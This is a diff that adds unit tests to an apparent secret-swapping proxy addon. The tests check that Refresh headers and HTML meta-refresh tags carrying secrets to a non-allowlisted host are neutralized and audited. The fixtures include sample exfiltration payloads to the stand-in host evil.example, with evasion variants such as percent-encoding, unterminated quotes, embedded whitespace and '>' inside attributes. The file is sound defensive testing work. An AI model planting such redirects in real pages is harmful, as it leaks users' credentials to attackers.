@@ -2656,6 +2656,358 @@ class RedirectSecretTests(unittest.TestCase):
                        "check-error"), a.audit_notes)
 
 
+class RefreshSecretTests(unittest.TestCase):
+    """Issue #860: a Refresh response header's url= target is followed
+    by clients exactly like a redirect Location, so a secret-bearing
+    Refresh to a non-allowlisted host is neutralized at headers time
+    and audited, with the same decode-stage detection as #94. Unlike
+    #94's Location kill the flow is NOT killed: the header rewrite
+    provably removes the navigation vector, and the response (often a
+    200 with a real page, unlike a 3xx) still loads. A bare
+    `Refresh: 5` (same-page refresh, no url=) is not a navigation
+    and is left alone."""
+
+    def _flow(self, status, refresh, host="github.com"):
+        a = make_addon()
+        resp = FakeResponse(b"", "text/html", status_code=status)
+        resp.headers.set_all("refresh", [refresh])
+        flow = Flow(Request(host, "/login"))
+        flow.response = resp
+        return a, flow, resp
+
+    def test_refresh_secret_to_non_allowlisted_host_neutralized(self):
+        a, flow, resp = self._flow(
+            200, "0; url=https://evil.example/cb?token=" + SECRETS["github"])
+        a.responseheaders(flow)
+        # Neutralized in place, NOT killed: the page still loads.
+        self.assertIsNone(flow.error)
+        self.assertIn(("github.com", "refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+        for _, _, reason in a.audit_notes:
+            self.assertNotIn(SECRETS["github"], reason)
+        val = resp.headers.get("refresh")
+        self.assertEqual(val, "hsurr:refresh-secret-refused")
+        self.assertNotIn(SECRETS["github"], val)
+
+    def test_percent_encoded_secret_in_refresh_neutralized(self):
+        # An open redirector percent-encodes the value: the verbatim
+        # header scrubber misses it, but the client decodes it on the
+        # follow-up navigation.
+        enc = urllib.parse.quote(SECRETS["pw"], safe="")
+        refresh = "0;url=https://evil.example/cb?next=" + enc
+        self.assertNotIn(SECRETS["pw"], refresh)  # encoded: blind spot
+        a, flow, resp = self._flow(200, refresh)
+        a.responseheaders(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn(("github.com", "refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+        self.assertEqual(resp.headers.get("refresh"),
+                         "hsurr:refresh-secret-refused")
+
+    def test_refresh_without_url_not_killed(self):
+        # Bare delay = same-page refresh: no navigation target, no
+        # exfil vector.
+        a, flow, resp = self._flow(200, "5")
+        a.responseheaders(flow)
+        self.assertIsNone(flow.error)
+        self.assertEqual(a.audit_notes, [])
+        self.assertEqual(resp.headers.get("refresh"), "5")
+
+    def test_refresh_to_allowlisted_host_scrubbed_not_killed(self):
+        # Same secret, allowlisted target: scrub-in-place, like #94.
+        a, flow, resp = self._flow(
+            200, "0; url=https://api.github.com/cb?token=" + SECRETS["github"])
+        a.responseheaders(flow)
+        self.assertIsNone(flow.error)
+        val = resp.headers.get("refresh")
+        self.assertNotIn(SECRETS["github"], val)
+        self.assertIn("hsurr:github", val)
+
+    def test_refresh_relative_url_not_killed(self):
+        a, flow, resp = self._flow(
+            200, "0;url=/cb?token=" + SECRETS["github"])
+        a.responseheaders(flow)
+        self.assertIsNone(flow.error)
+        self.assertNotIn(SECRETS["github"], resp.headers.get("refresh"))
+
+    def test_refresh_without_secret_not_killed(self):
+        a, flow, _ = self._flow(200, "0;url=https://evil.example/cb?x=1")
+        a.responseheaders(flow)
+        self.assertIsNone(flow.error)
+        self.assertEqual(a.audit_notes, [])
+
+    def test_refresh_url_unit(self):
+        t = sa.SwapAddon._refresh_url
+        self.assertEqual(t("0; url=https://evil.example/cb"),
+                         "https://evil.example/cb")
+        self.assertEqual(t('5, URL="https://evil.example/cb?a=b"'),
+                         "https://evil.example/cb?a=b")
+        self.assertEqual(t("0;url='https://evil.example/cb'"),
+                         "https://evil.example/cb")
+        self.assertEqual(t("0; URL = https://evil.example/cb ;"),
+                         "https://evil.example/cb ;")
+        # Unquoted target runs to end of value: a `;` inside it is
+        # part of what the client navigates to, so the check sees it.
+        self.assertEqual(t("0;url=https://evil.example/cb;token=1"),
+                         "https://evil.example/cb;token=1")
+        # Whitespace does NOT terminate the target: per the HTML
+        # Standard the unquoted URL runs to the end of the input, and
+        # the client navigates past the space.
+        self.assertEqual(t("0;url=https://evil.example/cb?pad=x k=1"),
+                         "https://evil.example/cb?pad=x k=1")
+        # Unterminated quote: browsers strip the lone opening quote
+        # and navigate anyway — the check must see the same target.
+        self.assertEqual(t('0;url="https://evil.example/cb?k=1'),
+                         "https://evil.example/cb?k=1")
+        self.assertIsNone(t("5"))
+        self.assertIsNone(t("0; url="))
+        self.assertIsNone(t(""))
+
+    def test_refresh_unterminated_quote_neutralized(self):
+        # `url="...` with no closing quote: the browser strips the
+        # lone quote and follows the secret-bearing URL; the check
+        # must not read it as a harmless relative reference.
+        enc = urllib.parse.quote(SECRETS["pw"], safe="")
+        refresh = '0;url="https://evil.example/cb?k=' + enc
+        self.assertNotIn(SECRETS["pw"], refresh)
+        a, flow, resp = self._flow(200, refresh)
+        a.responseheaders(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn(("github.com", "refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+        self.assertEqual(resp.headers.get("refresh"),
+                         "hsurr:refresh-secret-refused")
+
+    def test_refresh_whitespace_before_secret_neutralized(self):
+        # A literal space inside the unquoted target does not stop
+        # the client — and must not stop the check.
+        enc = urllib.parse.quote(SECRETS["pw"], safe="")
+        refresh = "0;url=https://evil.example/cb?pad=x k=" + enc
+        self.assertNotIn(SECRETS["pw"], refresh)
+        a, flow, resp = self._flow(200, refresh)
+        a.responseheaders(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn(("github.com", "refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+        self.assertEqual(resp.headers.get("refresh"),
+                         "hsurr:refresh-secret-refused")
+
+    def test_refresh_with_sse_stream_still_killed(self):
+        # Neutralize-without-kill must not become a stream bypass: a
+        # never-ending stream can never be body-scrubbed, so the
+        # finding-40e refusal still kills the flow even though the
+        # Refresh half alone would not.
+        enc = urllib.parse.quote(SECRETS["pw"], safe="")
+        a = make_addon()
+        resp = FakeResponse(b"", "text/event-stream", status_code=200)
+        resp.headers.set_all(
+            "refresh", ["0;url=https://evil.example/cb?k=" + enc])
+        flow = Flow(Request("github.com", "/events"))
+        flow.response = resp
+        a.responseheaders(flow)
+        self.assertIsNotNone(flow.error)  # killed by the stream refusal
+        self.assertIn(("github.com", "refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+        self.assertIn(("github.com", "stream-refused", "sse"),
+                      a.audit_notes)
+
+
+class MetaRefreshSecretTests(unittest.TestCase):
+    """Issue #860: an HTML <meta http-equiv="refresh"
+    content="0;url=<target>"> with a secret-bearing target to a
+    non-allowlisted host. The body scrubber is verbatim-only and
+    blind to the percent-encoded form; the browser's follow-up
+    navigation would carry the real secret off-allowlist. The URL is
+    neutralized in place (the page still loads — killing the whole
+    page over one tag would be a disproportionate denial) and the
+    refusal is audited."""
+
+    def _flow(self, body, host="github.com", ctype="text/html"):
+        a = make_addon()
+        resp = FakeResponse(body, ctype, status_code=200)
+        flow = Flow(Request(host, "/page"))
+        flow.response = resp
+        return a, flow, resp
+
+    def test_meta_refresh_secret_neutralized_not_killed(self):
+        enc = urllib.parse.quote(SECRETS["pw"], safe="")
+        body = (b'<html><head><meta http-equiv="refresh" '
+                b'content="0;url=https://evil.example/cb?k=' + enc.encode()
+                + b'"></head><body>hi</body></html>')
+        self.assertNotIn(SECRETS["pw"].encode(), body)  # encoded: blind
+        a, flow, resp = self._flow(body)
+        a.response(flow)
+        self.assertIsNone(flow.error)  # neutralized in place, page loads
+        text = resp.text
+        self.assertNotIn("evil.example/cb", text)
+        self.assertIn("hsurr:meta-refresh-secret-refused", text)
+        self.assertIn("<body>hi</body>", text)  # rest of page intact
+        self.assertIn(("github.com", "meta-refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+        for _, _, reason in a.audit_notes:
+            self.assertNotIn(SECRETS["pw"], reason)
+
+    def test_meta_refresh_verbatim_secret_to_allowlisted_host_scrubbed(self):
+        # Allowlisted target keeps verbatim scrub-in-place; no audit,
+        # no neutralization.
+        body = (b'<meta http-equiv="refresh" content="0;url='
+                b'https://api.github.com/cb?token=' + SECRETS["github"].encode()
+                + b'">')
+        a, flow, resp = self._flow(body)
+        a.response(flow)
+        self.assertIsNone(flow.error)
+        self.assertNotIn(SECRETS["github"], resp.text)
+        self.assertNotIn("hsurr:meta-refresh-secret-refused", resp.text)
+        self.assertEqual(a.audit_notes, [])
+
+    def test_meta_refresh_no_secret_untouched(self):
+        body = (b'<meta http-equiv="refresh" '
+                b'content="0;url=https://evil.example/cb?x=1">')
+        a, flow, resp = self._flow(body)
+        a.response(flow)
+        self.assertIsNone(flow.error)
+        self.assertEqual(resp.text, body.decode("utf-8"))
+        self.assertEqual(a.audit_notes, [])
+
+    def test_meta_refresh_attribute_order_and_quotes(self):
+        # content before http-equiv, single quotes, uppercase tag.
+        enc = urllib.parse.quote(SECRETS["sess"], safe="")
+        body = ("<META content='0; URL=https://evil.example/cb?k=" + enc
+                + "' http-equiv='refresh'>").encode()
+        a, flow, resp = self._flow(body)
+        a.response(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn("hsurr:meta-refresh-secret-refused", resp.text)
+        self.assertNotIn("evil.example/cb", resp.text)
+        self.assertIn(("github.com", "meta-refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+
+    def test_meta_refresh_relative_url_not_neutralized(self):
+        body = (b'<meta http-equiv="refresh" content="0;url=/cb?token='
+                + SECRETS["github"].encode() + b'">')
+        a, flow, resp = self._flow(body)
+        a.response(flow)
+        self.assertIsNone(flow.error)
+        # Verbatim secret still scrubbed; URL itself left alone.
+        self.assertNotIn(SECRETS["github"], resp.text)
+        self.assertNotIn("hsurr:meta-refresh-secret-refused", resp.text)
+        self.assertEqual(a.audit_notes, [])
+
+    def test_meta_refresh_non_html_body_not_scanned(self):
+        # Meta-refresh is an HTML construct: JSON bodies are not
+        # regex-scanned.
+        body = (b'{"refresh": "0;url=https://evil.example/cb?k='
+                + SECRETS["github"].encode() + b'"}')
+        a, flow, resp = self._flow(body, ctype="application/json")
+        a.response(flow)
+        self.assertIsNone(flow.error)
+        self.assertNotIn("hsurr:meta-refresh-secret-refused", resp.text)
+        self.assertEqual(a.audit_notes, [])
+
+    def test_meta_refresh_gt_inside_content_value_still_scanned(self):
+        # A `>` inside the content value itself (before the secret):
+        # the browser parses the full tag and follows the URL, so the
+        # scan must see the whole tag too — not truncate at the `>`.
+        enc = urllib.parse.quote(SECRETS["sess"], safe="")
+        body = (b'<meta http-equiv="refresh" content="0;url='
+                b'https://evil.example/cb?pad=>&k=' + enc.encode() + b'">')
+        a, flow, resp = self._flow(body)
+        a.response(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn("hsurr:meta-refresh-secret-refused", resp.text)
+        self.assertNotIn("evil.example/cb", resp.text)
+        self.assertIn(("github.com", "meta-refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+
+    def test_meta_refresh_unterminated_quote_neutralized(self):
+        # `url="...` with no closing quote inside the content value:
+        # the browser strips the lone quote and navigates anyway.
+        enc = urllib.parse.quote(SECRETS["sess"], safe="")
+        body = (b'<meta http-equiv="refresh" content=\'0;url="'
+                b'https://evil.example/cb?k=' + enc.encode() + b"'>")
+        a, flow, resp = self._flow(body)
+        a.response(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn("hsurr:meta-refresh-secret-refused", resp.text)
+        self.assertNotIn("evil.example/cb", resp.text)
+        self.assertIn(("github.com", "meta-refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+
+    def test_meta_refresh_check_error_neutralizes_fail_closed(self):
+        # A detection-path exception must neutralize, never forward
+        # the possibly secret-bearing URL, and the failure is audited.
+        enc = urllib.parse.quote(SECRETS["sess"], safe="")
+        body = (b'<meta http-equiv="refresh" content="0;url='
+                b'https://evil.example/cb?k=' + enc.encode() + b'">')
+        a, flow, resp = self._flow(body)
+        with mock.patch.object(sa.SwapAddon, "_redirect_target_host",
+                               side_effect=RuntimeError("boom")):
+            a.response(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn("hsurr:meta-refresh-secret-refused", resp.text)
+        self.assertNotIn("evil.example/cb", resp.text)
+        self.assertIn(("github.com", "meta-refresh-secret-refused",
+                       "meta-refresh-check-error"), a.audit_notes)
+
+    def test_meta_refresh_whitespace_before_secret_neutralized(self):
+        # A literal space inside the content's url= does not stop the
+        # browser — and must not stop the scan.
+        enc = urllib.parse.quote(SECRETS["pw"], safe="")
+        body = (b'<meta http-equiv="refresh" content="0;url='
+                b'https://evil.example/cb?pad=x k=' + enc.encode() + b'">')
+        self.assertNotIn(SECRETS["pw"].encode(), body)  # encoded: blind
+        a, flow, resp = self._flow(body)
+        a.response(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn("hsurr:meta-refresh-secret-refused", resp.text)
+        self.assertNotIn("evil.example/cb", resp.text)
+        self.assertIn(("github.com", "meta-refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+
+    def test_meta_refresh_gt_inside_quoted_attr_still_scanned(self):
+        # A `>` inside a quoted attribute BEFORE content must not
+        # truncate the tag: the browser parses (and follows) the full
+        # tag, so the scan must see it too.
+        enc = urllib.parse.quote(SECRETS["sess"], safe="")
+        body = (b'<meta http-equiv="refresh" data-x="a>b" content="0;url='
+                b'https://evil.example/cb?k=' + enc.encode() + b'">')
+        a, flow, resp = self._flow(body)
+        a.response(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn("hsurr:meta-refresh-secret-refused", resp.text)
+        self.assertNotIn("evil.example/cb", resp.text)
+        self.assertIn(("github.com", "meta-refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+
+    def test_meta_refresh_xhtml_body_scanned(self):
+        # Browsers honor http-equiv=refresh in XHTML documents too.
+        enc = urllib.parse.quote(SECRETS["sess"], safe="")
+        body = (b'<meta http-equiv="refresh" content="0;url='
+                b'https://evil.example/cb?k=' + enc.encode() + b'"/>')
+        a, flow, resp = self._flow(body, ctype="application/xhtml+xml")
+        a.response(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn("hsurr:meta-refresh-secret-refused", resp.text)
+        self.assertNotIn("evil.example/cb", resp.text)
+        self.assertIn(("github.com", "meta-refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+
+    def test_meta_refresh_multiple_tags_second_neutralized_first_untouched(self):
+        enc = urllib.parse.quote(SECRETS["sess"], safe="")
+        body = (b'<meta http-equiv="refresh" content="5">'
+                b'<meta http-equiv="refresh" content="0;url='
+                b'https://evil.example/cb?k=' + enc.encode() + b'">')
+        a, flow, resp = self._flow(body)
+        a.response(flow)
+        self.assertIsNone(flow.error)
+        text = resp.text
+        self.assertIn('content="5"', text)  # innocent tag untouched
+        self.assertIn("hsurr:meta-refresh-secret-refused", text)
+        self.assertNotIn("evil.example/cb", text)
+        self.assertEqual(len([n for n in a.audit_notes
+                              if n[1] == "meta-refresh-secret-refused"]), 1)
+
+
 class AuditLogDiskGuardTests(unittest.TestCase):
     """Finding 198: swap.log must be bounded, and the no-swap-without-
     trail invariant must hold when the disk fills. The addon guards the
